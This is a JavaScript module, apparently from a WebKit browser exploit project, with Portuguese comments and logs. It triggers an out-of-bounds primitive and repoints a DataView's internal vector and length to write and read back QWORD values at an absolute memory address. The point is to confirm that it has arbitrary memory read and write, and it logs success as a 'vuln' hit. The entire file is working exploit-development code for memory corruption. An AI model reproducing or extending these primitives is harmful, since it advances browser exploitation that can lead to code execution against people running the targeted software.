// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v22: Teste de Bloco com Primitivas de Baixo Nível e Pausas)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    setup_arb_access,             // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
    perform_raw_read,             // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
    perform_raw_write,            // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
    restore_oob_dv_metadata,      // <-- NOVA PRIMITIVA DE BAIXO NÍVEL
    // arb_read e arb_write de alto nível podem ser usadas se preferir,
    // mas para este teste granular, vamos usar as de baixo nível.
} from '../core_exploit.mjs';     // CERTIFIQUE-SE DE USAR A VERSÃO v22 ACIMA
import { WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v22_BlockRW_LowLevelCtrl";

// === Constantes ===
const TEST_BASE_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VALUE_1 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VALUE_2 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VALUE_3 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_VALUES = [BLOCK_VALUE_1, BLOCK_VALUE_2, BLOCK_VALUE_3];
const PAUSE_BETWEEN_BLOCK_OPS_MS = 150;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBlockRWWithLowLevelCtrl`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando L/E de Bloco com Controle de Baixo Nível do DV ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        base_address_str: TEST_BASE_ABSOLUTE_ADDRESS.toString(true),
        values_written_str: BLOCK_VALUES.map(v => v.toString(true)),
        values_read_back_str: [],
        verification_details: [],
        message: "Teste não iniciado."
    };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB inicial não pôde ser configurado.");
        }
        logS3("PASSO 1: Ambiente OOB inicial configurado.", "info", FNAME_CURRENT_TEST);

        // PASSO 2: Escrever a sequência de valores
        logS3(`PASSO 2: Escrevendo bloco de ${BLOCK_VALUES.length} valores QWORD começando em ${exploit_result.base_address_str}...`, "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_VALUES.length; i++) {
            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
            const value_to_write = BLOCK_VALUES[i];
            logS3(`  Configurando DV para ${current_address.toString(true)} e escrevendo ${value_to_write.toString(true)}...`, "info", FNAME_CURRENT_TEST);
            
            setup_arb_access(current_address); // Configura m_vector e m_length
            perform_raw_write(0, value_to_write, 8); // Escreve no offset 0 do DV reconfigurado
            restore_oob_dv_metadata(); // Restaura DV para o estado normal (apontando para oob_array_buffer_real)
            
            logS3(`    Escrita e restauração para valor ${i + 1} concluídas. Pausando...`, 'debug', FNAME_CURRENT_TEST);
            await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS);
        }
        logS3(`  Escrita do bloco realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS * 2); // Pausa maior antes de ler

        // PASSO 3: Ler de volta os valores do bloco individualmente e verificar
        logS3(`PASSO 3: Lendo de volta os valores do bloco individualmente...`, "info", FNAME_CURRENT_TEST);
        let all_values_match = true;
        for (let i = 0; i < BLOCK_VALUES.length; i++) {
            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
            const expected_value = BLOCK_VALUES[i];
            
            logS3(`  Configurando DV para ${current_address.toString(true)} para leitura do valor ${i + 1}...`, 'info', FNAME_CURRENT_TEST);
            setup_arb_access(current_address);
            const read_value_obj = perform_raw_read(0, 8); // Lê do offset 0 do DV reconfigurado
            restore_oob_dv_metadata();
            
            const read_value_str = isAdvancedInt64Object(read_value_obj) ? read_value_obj.toString(true) : "ERRO_LEITURA_BLOCO";
            exploit_result.values_read_back_str.push(read_value_str);
            
            const verification_msg = `  Lido de ${current_address.toString(true)}: ${read_value_str} (Esperado: ${expected_value.toString(true)})`;
            if (read_value_str === expected_value.toString(true)) {
                logS3(verification_msg + " - CORRETO!", "good", FNAME_CURRENT_TEST);
                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: true});
            } else {
                logS3(verification_msg + " - INCORRETO!", "error", FNAME_CURRENT_TEST);
                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: false});
                all_values_match = false;
            }
            logS3(`    Leitura e restauração para valor ${i + 1} concluídas. Pausando...`, 'debug', FNAME_CURRENT_TEST);
            await PAUSE_S3(PAUSE_BETWEEN_BLOCK_OPS_MS);
        }

        if (!all_values_match) {
            exploit_result.message = `Falha na verificação do bloco de dados em ${exploit_result.base_address_str} (com controle de baixo nível do DV).`;
        } else {
            exploit_result.success = true;
            exploit_result.message = `SUCESSO! Bloco de dados escrito e lido corretamente do endereço base ${exploit_result.base_address_str} (com controle de baixo nível do DV).`;
        }
        
        if (exploit_result.success) {
            logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: ARB BLOCK LOWLVL OK!`;
        } else {
            logS3(exploit_result.message, "error", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Bloco (LowLvl)`;
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        exploit_result.success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        // ... (logs de resultado como antes) ...
        logS3(`Resultado Teste L/E de Bloco com Controle Baixo Nível DV (v22): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        exploit_result.verification_details.forEach(detail => {
            logS3(`    Verificação Bloco Offset +${detail.offset}: Lido=${detail.read}, Esperado=${detail.expected}, Match=${detail.match}`, detail.match ? "debug" : "error", FNAME_CURRENT_TEST);
        });
    }

    return {
        errorOccurred: errorCapturedMain,
        exploit_attempt_result: exploit_result,
    };
}
